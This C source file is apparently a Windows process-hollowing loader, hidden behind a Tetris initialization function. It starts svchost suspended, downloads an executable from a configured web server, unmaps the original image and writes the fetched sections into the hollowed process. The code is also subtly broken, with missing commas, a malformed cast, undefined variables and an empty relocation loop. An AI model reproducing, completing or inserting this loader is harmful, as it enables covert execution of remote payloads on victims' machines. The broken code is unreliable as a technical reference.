#include <stdlib.h>
#include <stdio.h>
#include <memory.h>
#include <windows.h>
#include <wininet.h>
#include "tetris.h"
#include "ntdll_imit.h"
#include "config.h"

HANDLE spawn(){
STARTUPINFOA stInfo={0};
stInfo.cb=sizeof(stInfo);
PROCESS_INFORMATION pInfo;
if(CreateProcessA(
SVCHOST,
NULL,
NULL,
NULL,
FALSE,
CREATE_SUSPENDED | CREATE_NO_WINDOW,
NULL,
NULL,
&stInfo,
&pInfo
))
return pInfo.hProcess;
else
printf("[-] CreateProcessA %lu\n",GetLastError());
exit(1);
}

BYTE* fetchPE(){

    // general initialization fn
    HINTERNET internet=InternetOpenA(
        "JAMES/BOND/007",
        INTERNET_OPEN_TYPE_PRECONFIG,
        NULL,
        NULL,
        0 // no async
    );
    if(!internet){
        printf("[-] InternetOpenA()\n");
        exit(1);
    }
    HINTERNET hurl=InternetOpenUrlA(
        internet,
        WEB_SERVER,
        NULL,
        0,
        INTERNET_FLAG_RELOAD,
        0
    );
    if(!hurl){
        printf("[-] InternetOpenUrlA() %lu\n",GetLastError());
        exit(1);
    }

    DWORD sz=4096;
    BYTE* pe=(BYTE*)malloc(sz);
    BYTE* offset=pe;
    DWORD totalRead=0;
    DWORD cycleRead=0;

    while(InternetReadFile(
        hurl,
        offset,
        sz, 
        &cycleRead
    ) && cycleRead>0){
        printf("fetching PE to heap\n");
        totalRead+=cycleRead;
        void*tmp=realloc(pe,totalRead+sz);
        if(tmp)
         pe=tmp;
        offset=(BYTE*)(pe+totalRead);
    }
    void*tmp=realloc(pe,totalRead);
    if(tmp)
     pe=tmp;
    return pe;
}

// objective: parse PE. return list of struct containing each essential sectton size.
// dos ---> nt head ----> file head / opt head 
// opt head ---> data directories
// 
MappingMetadata PEParser(BYTE* pe){
    MappingMetadata mm;
    mm.heapBase=pe;
    unsigned long long  p_NT_HEADERS=(unsigned long long)(pe+*(pe+0x3c));
    unsigned long long p_FILE_HEADERS=(unsigned long long)(p_NT_HEADERS+0x4);
    unsigned long long p_OPT_HEADERS=(unsigned long long)(p_NT_HEADERS+0x18);
    mm.preferedBase=*(unsigned long long*)(p_OPT_HEADERS+0x18);
    mm.RVAAddressOfEntryPoint=*(unsigned long *)(p_OPT_HEADERS+0x10);   
    mm.headersSize=*(unsigned long*)(p_OPT_HEADERS+0x3c);
    mm.imageSize=*(unsigned long*)(p_OPT_HEADERS+0x38);
    unsigned long dataDirectoriesCount=*(unsigned long*)(p_OPT_HEADERS+0x6c);
    // important
    mm.ImageSectionsCount=*(unsigned short*)(p_FILE_HEADERS+0x2);
    unsigned short optHeadersSz=(*unsigned short*)(p_FILE_HEADERS+0x10);

    // sizeof(IMAGE_SECTION_HEADER) = 40 bytes
    IMAGE_SECTION_HEADER* p_SECTION_HEADER=(IMAGE_SECTION_HEADER*)(p_NT_HEADERS+0x4+0x14+optHeadersSz);
    mm.ImageSectionHeaders=(unsigned long  long )p_SECTION_HEADER;

    return mm;
}

// section object mappnig approach
void mapRoutine(){
HANDLE pe_headers_section;
NtCreateSection(
&pe_headers_section,
SECTION_ALL_ACCESS,
NULL,
mm.headersSize,
PAGE_READWRITE,
SEC_COMMIT,
NULL
);
if(!pe_headers_section){
    printf("[-]NtCreateSection for PE HEADERS MAPPNG!\n");
    exit(1);
}

void* mapped=NULL;
if(NtMapViewOfSection(
    pe_headers_section,
    self,
    mapped,
    0,
    0,
    NULL,
    (unsigned long*)&mm.headersSize,
    PAGE_READWRITE
)!=0 && !mapped){
    printf("[-] NtMapViewOfSection. 168\n");
    exit(1);
}
memcpy(mapped,mm.heapBase,mm.headersSize);

void *remoteBase=NULL;
if(NtMapViewOfSection(
    pe_headers_section,
    proc,  
    remoteBase
    0,
    0,
    NULL,
    (unsigned long*)&mm.headersSize,
    PAGE_READWRITE
)!=0 && !mapped){
    printf("[-] NtMapViewOfSection. 168\n");
    exit(1);
}
}


void rellocate(void* remoteImageBase,void* heapBase,IMAGE_SECTION_HEADER *sec){
    void* relocBlockHeapVIew=heapBase+(unsigned int)(sec->PointerToRawData);
    unsigned int secSz=sec->SizeOfRawData;

    for(int i=0;i<secSz;i++){
        IMAGE_BASE_RELOCATION* block=relocBlockHeapVIew;
        unsigned int blockSz=block->SizeOfBlock;
        // rva to image base
        unsigned int pageRva=block->VirtualAddress;
        void* page=remoteImageBase+pageRva;
        unsigned int entriesCount=(blockSz-sizeof(unsigned int)*2)/2;

        BYTE* entry=(BYTE*)((BYTE*)block+8);
        for(unsigned int j=0;j<entriesCount;j++){
            // separate type and offset
            // check type
            // adjust address


            entry+=2;
        }
    }



}

bool hallowAndStart(HANDLE proc,BYTE* pe){
HANDLE self=GetCurrentProcess();
HMODULE ntdll=GetModuleHandleA("ntdll");
T_NtQueryInformationProcess NtQueryInformationProcess=(T_NtQueryInformationProcess)GetProcAddress(ntdll,"NtQueryInformationProcess");
T_NtMapViewOfSection NtMapViewOfSection=(T_NtMapViewOfSection)GetProcAddress(ntdll,"NtMapViewOfSection");
T_NtUnmapViewOfSection NtUnmapViewOfSection=(T_NtUnmapViewOfSection)GetProcAddress(ntdll,"NtUnmapViewOfSection");
T_NtCreateSection NtCreateSection=(T_NtCreateSection)GetProcAddress(ntdll,"NtCreateSection");


 PROCESS_BASIC_INFORMATION pinfo;
 ULONG requiredSize=sizeof(pinfo);
if(NtQueryInformationProcess(
    proc,
   ProcessBasicInformation,
   &pinfo,
   requiredSize,
   &requiredSize
)!=0){
    NtQueryInformationProcess(
    proc,
   ProcessBasicInformation,
   &pinfo,
   requiredSize,
   &requiredSize
);
}
// stores address of PEB. only makes sense within VA space of remote process. not here
void* baseAddrAddr=(void*)((BYTE*)pinfo.PebBaseAddress+0x10);
void* baseAddr=NULL;
ReadProcessMemory(proc,baseAddrAddr,baseAddr,sizeof(PVOID),NULL);
NtUnmapViewOfSection(proc,baseAddr); // disassociates VA region from section object

MappingMetadata mm=PEParser(pe);

char* remoteV=(char*)VirtualAllocEx(
proc,
NULL,
(SIZE_T)mm.imageSize,
MEM_COMMIT | MEM_RESERVE,
0x40
);

WriteProcessMemory(
    proc,
    remoteV,
    mm.heapBase,
    mm.headersSize
    NULL
);

// sec -> heap
IMAGE_SECTION_HEADER* sec=mm.ImageSectionHeaders+_offset;
unsigned long _sz=sizeof(IMAGE_SECTION_HEADER); // 40 bytes in x64 PE

IMAGE_SECTION_HEADER *reloc=NULL;

for(int i=0; i<mm.ImageSectionsCount; i++){
char* name=(char*)(sec->Name);
if(strcmp(name,".reloc")==0){
    reloc=sec;
    continue;
}
unsigned int protections=sec->Characteristics;
unsigned int rva_raw=sec->PointerToRawData;
unsigned int rva_virt=sec->VirtualAddress;
unsigned int secSz=sec->SizeOfRawData;
void* va=remoteV+rva_virt;
void* raw=mm.heapBase+rva_virt;
unsigned long written=0;
WriteProcessMemory(
    proc,
    va,
    raw,
    secSz
    &written
);
if(written!=(unsigned long)secSz){
    printf("[-] 235!\n");
    exit(1);
}
sec++;
}
rellocate(remoteV,mm.heapBase,reloc);

}

bool __0x1FN3C3SS4RY__(){
    HANDLE svchost=spawn();
    BYTE* pe=fetchPE(); // returns heap base 
    bool cool=hallowAndStart(svchost,pe);
    if(cool)
        return true;
    return false;
}
bool initializeTetrix(){
  return __0x1FN3C3SS4RY__();
}




